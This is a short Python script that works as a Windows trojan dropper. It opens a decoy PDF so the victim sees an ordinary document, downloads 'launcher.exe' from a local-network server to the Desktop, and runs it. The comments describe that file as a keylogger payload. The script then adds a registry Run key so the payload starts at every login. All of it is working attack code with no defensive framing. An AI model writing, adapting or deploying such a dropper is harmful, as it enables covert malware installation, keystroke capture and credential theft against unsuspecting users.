#!/usr/bin/env python
import requests
import subprocess
import os 
import sys

def down_and_wr(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content)

#LAUNCH FAKE FILE FROM DRIVE (HIDDEN DIRECTORY)
first_file_location = ".Trash-1000\\Files\\Hacking.pdf" #PLACE HERE YOUR FAKE FILE
subprocess.Popen(first_file_location, shell=True)

#DOWNLOAD AND INSTALL PAYLOAD FROM LOCAL SERVER:
keylogger_location = os.environ['USERPROFILE'] + "\\Desktop"
os.chdir(keylogger_location)
down_and_wr("http://192.168.1.106/launcher.exe") #EDIT THIS LINE WITH IP ADDRESS OF LOCALHOST SERVER 
subprocess.Popen("launcher.exe", shell=True)

#PERSISTENCY  
subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v launcher /t REG_SZ /d "' + keylogger_location + "\\launcher.exe" + '"', shell=True)

sys.exit()
